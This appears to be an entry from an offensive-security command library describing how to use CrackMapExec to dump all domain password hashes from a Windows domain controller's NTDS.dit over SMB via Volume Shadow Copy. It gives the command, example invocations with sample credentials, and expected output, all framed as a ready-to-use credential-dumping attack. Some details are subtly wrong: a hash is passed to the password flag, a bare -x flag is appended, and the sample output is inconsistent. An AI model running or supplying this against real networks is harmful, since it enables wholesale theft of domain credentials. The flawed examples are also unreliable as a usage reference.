---
id: 07c011d0-e4cc-4c7a-a0ef-469819d59e29
name: crackmapexec-smb-ntds-vss
type: command
executor: bash
data: cme smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD --ntds vss
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - ntds
  - smb
  - credential-dumping
verified: true
validated: true
---

# crackmapexec-smb-ntds-vss

## Command

```bash
cme smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD --ntds vss
```

## Description

This command uses CrackMapExec to extract the NTDS.dit database from a remote Windows domain controller over SMB using the Volume Shadow Copy Service (VSS) method, dumping all domain user hashes without direct file access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address of the target domain controller | Yes |
| -u | Username for SMB authentication | Yes |
| $_USERNAME | Actual username value | Yes |
| -p | Password for SMB authentication | Yes |
| $_PASSWORD | Actual password or hash | Yes |
| --ntds vss | Use VSS method for NTDS extraction | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.10 -u administrator -p Password123 --ntds vss
```

### Advanced Usage

```bash
cme smb 192.168.1.10 -u admin -p aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --ntds vss -x
```

## Expected Output

SMB         192.168.1.10    445    DOMAIN      [*] Windows 10.0 Build 19041 x64 (name:DC01) (domain:domain.local) (signing:True) (SMBv1:False)
SMB         192.168.1.10    445    DOMAIN      [+] domain.local\administrator:Password123 NTLMv2-SSP Hash: ::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0...
[*] Dumping NTDS.dit using VSS
[*] Saved NTDS hashes to /tmp/ntds.dit.hashes

## Related

- [[procedures/Dump-AD-Domain-Credentials-with-Hashdump-NinjaCopy-and-CME]]
- [[tools/CrackMapExec]]
